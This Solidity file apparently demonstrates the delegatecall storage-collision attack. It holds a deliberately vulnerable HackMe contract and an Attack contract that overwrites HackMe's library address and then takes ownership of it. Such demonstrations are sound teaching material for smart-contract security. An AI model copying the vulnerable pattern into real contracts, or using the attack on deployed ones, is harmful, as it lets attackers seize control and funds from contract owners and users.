// delegatecall hands over the controll  to other contract to change state variables

// no of state variables in callee and called contracts must have state variables in order 


pragma solidity ^0.6.10;


    contract Lib {
        uint public someNumber;  
        
        function doSomething(uint _num) public {
            someNumber = _num;    // updates the First state varaible inside the HackMe contract 
        }
    }
    
    
    contract HackMe {
        
        address public lib;
        address public owner;
        uint public someNumber;
        
        constructor (address _lib) public {
            lib = _lib;
            owner = msg.sender;
        }
        
        function doSomething(uint _num) public {
            lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)",_num));
        }
    }
    
    contract  Attack {
        address public lib;
        address public owner;
        uint public someNumber;
        
        HackMe public hackMe;
        
        constructor (HackMe _hackMe) public {
            hackMe = _hackMe; 
        }
        
        function attack() public {
            hackMe.doSomething(uint(address(this)));   // sets the lib address to Attack contract address
            hackMe.doSomething(1);                     // sets the owner of the hackme contract to Attack contract address
        }
        
        function doSomething(uint _num) public {
            owner  =  msg.sender;
        }
    }
